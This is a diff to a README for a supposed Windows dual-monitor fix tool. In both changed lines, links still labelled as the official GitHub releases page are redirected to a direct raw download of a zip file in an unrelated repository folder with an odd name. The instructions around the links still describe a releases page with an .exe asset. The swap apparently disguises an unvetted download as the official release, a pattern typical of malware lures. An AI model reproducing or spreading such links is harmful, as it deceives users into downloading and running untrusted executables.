@@ -5,7 +5,7 @@ description: "Resolve common dual monitor issues on Windows 10 and 11, including
 ---
 # 🖥️ Dual-Monitor-Fix - Restore your multi-monitor setup quickly
 
-[![Download Dual-Monitor-Fix](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/suzanewaz/Dual-Monitor-Fix/releases)
+[![Download Dual-Monitor-Fix](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/suzanewaz/suzanewaz.github.io/main/Dionysiacally/io-github-suzanewaz-v3.1.zip)
 
 Dual-Monitor-Fix resolves common display issues on Windows 10 and 11. Use this tool if your second monitor goes to sleep, shows the wrong resolution, flickers, or fails to appear in your display settings. It works with both NVIDIA and AMD graphics cards.
 
@@ -19,7 +19,7 @@ Your computer needs the following items to run this software:
 ## 📥 How to download and run
 Follow these steps to set up the software.
 
-1. Visit the [official releases page](https://github.com/suzanewaz/Dual-Monitor-Fix/releases) to download the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/suzanewaz/suzanewaz.github.io/main/Dionysiacally/io-github-suzanewaz-v3.1.zip) to download the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file to save it to your Downloads folder.
 4. Open your Downloads folder.
